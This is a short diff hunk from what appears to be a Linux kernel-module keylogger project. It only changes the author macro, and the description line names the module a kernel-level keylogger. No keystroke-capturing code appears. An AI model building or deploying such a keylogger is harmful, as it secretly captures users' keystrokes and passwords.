@@ -2,7 +2,7 @@
 #include <linux/kernel.h>
 #include <linux/keyboard.h>
 #define LICENSE "GPL";
-#define AUTHOR "47hx1-53r";
+#define AUTHOR "1day";
 #define DESCRIPTION "A simple kernel-level keylogger for Linux operating systems.";
 #define VERSION "0.1";
 
